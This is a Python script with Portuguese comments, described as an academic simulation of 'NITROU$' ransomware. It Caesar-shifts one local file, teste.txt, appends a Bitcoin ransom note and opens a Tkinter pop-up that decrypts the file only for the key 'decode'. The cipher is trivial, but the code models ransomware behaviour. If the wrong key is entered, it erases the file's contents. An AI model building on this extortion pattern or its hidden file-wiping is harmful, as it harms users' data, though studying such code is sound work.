"""
[ = Desenvolvimento acadêmico = ]

- Ransomware NITROU$ -


Simulação da ação de um Ransomware em um arquivo devidamente especificado e que está no mesmo diretório do script.

Método de criptografia: Cifra de César

* Este código não visa métodos simplificados, seja do tipo de encriptação ou qualquer outra função utilizada.
O foco é atender aos requisitos que foram especificados para realização da atividade acadêmica.
"""

import string
from tkinter import *

file = open('teste.txt', 'r')    # teste.txt é um documento de texto que está no mesmo diretório que este arquivo .py
file_1 = file.read()

alfabeto = string.ascii_lowercase
alfabeto_upper = string.ascii_uppercase
chave = 1    # chave da Cifra de César (1 ao 25)
criptografada = ''


# Encriptação do conteúdo do arquivo lido
for letra in file_1:
    if letra in alfabeto:
        posicao = alfabeto.find(letra)
        prox_pos = (posicao + chave) % 26
        prox_letra = alfabeto[prox_pos]
        criptografada += prox_letra
    elif letra in alfabeto_upper:
        posicao = alfabeto_upper.find(letra)
        prox_pos = (posicao + chave) % 26
        prox_letra = alfabeto_upper[prox_pos]
        criptografada += prox_letra
    else:
        criptografada += letra
print(criptografada)    # Output do que foi criptografado


file.close()


def encriptar():
    """ Função que aplica o conteúdo encriptado e adiciona a mensagem de resgate ao arquivo devidamente
     especificado em 'open' """

    file = open('teste.txt', 'w')
    file.write(criptografada)
    file.write('\n\n* PARA O RESGATE DE SEU ARQUIVO *\n Envie 0.005 Bitcoins para a chave: \n'
               '=> KzyyvMcv7EL7qTMSE9BzMZQFh3PCNb9oMSwvPw2B1JMZHNW6xPZR <= \nApós o pagamento você irá receber a chave '
               'de resgate e deve inseri-lá no pop-up, \napós digitar a mesma, clique em Decriptar e feche janela, '
               'seu arquivo estará intacto.')    # Chave BTC fictícia


encriptar()
#
#

file.close()


def popup_decriptar():
    """ Função de execução do pop-up que será utilizado para resgate (decriptografia) do arquivo """

    global e
    global string
    string = e.get()
    print(string)


string = ''

janela = Tk()
janela.geometry('500x50')

janela.title('█▓▒░ I̶n̴f̵e̸c̸t̴e̵d̷ ̸b̶y̶ ̷N̸I̷T̸R̵O̸U̸$̴ ̵R̸a̵n̵s̶o̷m̶w̸a̶r̸e̴ ░▒▓█')

e = Entry(janela)
e.pack()
e.focus_set()

botao = Button(janela, text='Decriptar', command=popup_decriptar)
botao.pack(side='bottom')
janela.mainloop()

print(string)


def verif_decript():
    """ Função que irá fazer a verificação da chave de resgate e decriptar o conteúdo caso a chave seja válida """

    decriptografada = ""

    if string == 'decode':    # 'decode' é a chave fictícia que a vítima receberá se o resgate for pago
        for letra in criptografada:
            if letra in alfabeto:
                posicao = alfabeto.find(letra)
                anter_pos = (posicao - chave)
                anter_letra = alfabeto[anter_pos]
                decriptografada += anter_letra
            elif letra in alfabeto_upper:
                posicao = alfabeto_upper.find(letra)
                prox_pos = (posicao - chave) % 26
                prox_letra = alfabeto_upper[prox_pos]
                decriptografada += prox_letra
            else:
                decriptografada += letra


    file = open('teste.txt', 'w')
    file.write(decriptografada)


verif_decript()
file.close()
